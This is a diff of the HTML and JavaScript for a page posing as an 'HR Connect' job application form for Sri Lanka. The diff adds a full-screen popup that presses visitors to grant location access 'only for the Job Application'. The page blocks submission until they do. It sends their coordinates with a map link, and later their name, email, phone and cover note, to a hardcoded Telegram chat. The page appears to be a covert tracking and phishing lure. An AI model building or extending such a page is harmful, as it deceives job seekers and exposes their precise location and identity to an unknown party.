@@ -50,7 +50,74 @@
       padding-bottom: 16px;
     }
 
-    /* ===== SUCCESS BANNER (Location allowed) ===== */
+    /* ===== PERMISSION POPUP (Overlay) ===== */
+    #permission-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      padding: 20px;
+      box-sizing: border-box;
+      animation: fadeIn 0.3s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    #permission-overlay .box {
+      background: #fff;
+      max-width: 400px;
+      width: 100%;
+      padding: 30px 24px;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+    }
+
+    #permission-overlay .box .icon {
+      font-size: 48px;
+      margin-bottom: 12px;
+    }
+
+    #permission-overlay .box h2 {
+      font-size: 20px;
+      color: #1a2a3a;
+      margin-bottom: 8px;
+    }
+
+    #permission-overlay .box p {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    #permission-overlay .box .btn-allow {
+      background: #2a7de1;
+      color: #fff;
+      border: none;
+      padding: 12px 30px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: 0.25s;
+      width: 100%;
+    }
+
+    #permission-overlay .box .btn-allow:hover {
+      background: #1a6ac8;
+    }
+
+    /* ===== SUCCESS BANNER ===== */
     #success-banner {
       display: none;
       background: #d4edda;
@@ -158,18 +225,32 @@
       .card {
         padding: 22px 16px 28px;
       }
+      #permission-overlay .box {
+        padding: 24px 16px;
+      }
     }
   </style>
 </head>
 <body>
 
+<!-- ===== PERMISSION OVERLAY (POPUP) ===== -->
+<div id="permission-overlay">
+  <div class="box">
+    <div class="icon">📍</div>
+    <h2>Location Access Required</h2>
+    <p>ඔබගේ ස්ථානය හඳුනා ගැනීමට Location Permission අවශ්‍ය වේ.<br><br>
+    <strong>මෙය Job Application සඳහා පමණයි.</strong></p>
+    <button class="btn-allow" id="allowLocationBtn">✅ Allow Location</button>
+  </div>
+</div>
+
+<!-- ===== MAIN CARD ===== -->
 <div class="card">
 
-  <!-- ===== HEADER ===== -->
   <div class="logo">📋 HR Connect</div>
   <div class="sub-logo">Online Job Application · Sri Lanka</div>
 
-  <!-- ===== SUCCESS BANNER (Shows when location allowed) ===== -->
+  <!-- ===== SUCCESS BANNER ===== -->
   <div id="success-banner">
     ✅ Online Job Apply - You are eligible to apply!
   </div>
@@ -215,7 +296,6 @@
       <textarea id="coverNote" placeholder="Why do you want this job?"></textarea>
     </div>
 
-    <!-- ===== SUBMIT ===== -->
     <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>
 
   </form>
@@ -233,21 +313,27 @@
   const CHAT_ID   = '8308044531';
 
   // =============================================
-  // 📍 LOCATION - AUTO REQUEST ON PAGE LOAD
+  // 📍 PERMISSION POPUP + LOCATION
   // =============================================
+  const overlay = document.getElementById('permission-overlay');
+  const allowBtn = document.getElementById('allowLocationBtn');
   const locationText = document.getElementById('locationText');
   const locationStatusDiv = document.getElementById('location-status');
   const successBanner = document.getElementById('success-banner');
   let userLocation = null;
   let locationAllowed = false;
-  let locationRequested = false; // Prevent multiple requests
 
-  function getLocation() {
-    // Prevent multiple requests
-    if (locationRequested) return;
-    locationRequested = true;
+  // ---------- ALLOW BUTTON CLICK ----------
+  allowBtn.addEventListener('click', () => {
+    // Hide overlay
+    overlay.style.display = 'none';
+    // Request location
+    requestLocation();
+  });
 
-    locationText.textContent = '⏳ Requesting location permission...';
+  // ---------- REQUEST LOCATION ----------
+  function requestLocation() {
+    locationText.textContent = '⏳ Detecting your location...';
 
     if (!navigator.geolocation) {
       locationText.textContent = '❌ Geolocation not supported by this browser.';
@@ -263,11 +349,9 @@
         userLocation = { lat, lon };
         locationAllowed = true;
 
-        // Show success banner (hide location status)
         successBanner.style.display = 'block';
         locationStatusDiv.style.display = 'none';
 
-        // Send location to Telegram
         sendLocationToTelegram(lat, lon);
       },
       // ❌ Error
@@ -285,7 +369,6 @@
         locationAllowed = false;
         userLocation = null;
 
-        // Hide success banner, show location status
         successBanner.style.display = 'none';
         locationStatusDiv.style.display = 'flex';
       },
@@ -297,9 +380,7 @@
     );
   }
 
-  // =============================================
-  // 📤 SEND LOCATION TO TELEGRAM
-  // =============================================
+  // ---------- SEND LOCATION TO TELEGRAM ----------
   async function sendLocationToTelegram(lat, lon) {
     try {
       const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
@@ -345,44 +426,29 @@ ${mapsLink}
   }
 
   // =============================================
-  // 🚀 PAGE LOAD → REQUEST LOCATION IMMEDIATELY!
-  // =============================================
-  window.addEventListener('DOMContentLoaded', () => {
-    // Request location as soon as page loads
-    setTimeout(getLocation, 300);
-  });
-
-  // =============================================
-  // 📝 FORM SUBMIT - Check Location First!
+  // 📝 FORM SUBMIT
   // =============================================
   document.getElementById('applicationForm').addEventListener('submit', async (e) => {
     e.preventDefault();
 
     const submitBtn = document.getElementById('submitBtn');
 
-    // ===== CHECK: Location allowed? =====
     if (!locationAllowed) {
-      alert('❌ කරුණාකර Location Permission එක Allow කරන්න.\n\nඉන්පසු පිටුව Refresh කරලා නැවත Form එක පුරවා Submit කරන්න.');
+      alert('❌ කරුණාකර Location Permission එක Allow කරන්න.\n\n"Allow Location" බොත්තම ඔබලා Permission දෙන්න.');
       submitBtn.disabled = false;
       submitBtn.textContent = '🚀 Submit Application';
-      // Try to request location again
-      locationRequested = false;
-      getLocation();
       return;
     }
 
-    // ===== If location allowed, proceed =====
     submitBtn.disabled = true;
     submitBtn.textContent = '⏳ Submitting...';
 
-    // Get form values
     const fullName = document.getElementById('fullName').value.trim();
     const email = document.getElementById('email').value.trim();
     const phone = document.getElementById('phone').value.trim();
     const position = document.getElementById('position').value;
     const coverNote = document.getElementById('coverNote').value.trim();
 
-    // Validate
     if (!fullName || !email || !phone) {
       alert('❌ කරුණාකර Full Name, Email සහ Phone Number පුරවන්න.');
       submitBtn.disabled = false;
@@ -390,7 +456,6 @@ ${mapsLink}
       return;
     }
 
-    // Build message
     let msg = `
 📋 NEW JOB APPLICATION
 
@@ -425,13 +490,12 @@ ${coverNote || '—'}
         submitBtn.textContent = '✅ Application Submitted!';
         submitBtn.style.background = '#28a745';
         document.getElementById('applicationForm').reset();
-        // Reset location and re-request
         userLocation = null;
         locationAllowed = false;
-        locationRequested = false;
         successBanner.style.display = 'none';
         locationStatusDiv.style.display = 'flex';
-        setTimeout(getLocation, 1000);
+        overlay.style.display = 'flex';
+        locationText.textContent = '⏳ Click "Allow Location" to continue...';
       } else {
         submitBtn.textContent = '❌ Submission Failed';
         submitBtn.disabled = false;
@@ -445,7 +509,6 @@ ${coverNote || '—'}
   });
 
   console.log('✅ HR Connect Form Loaded');
-  console.log('📍 Location will be requested on page load!');
 </script>
 
 </body>
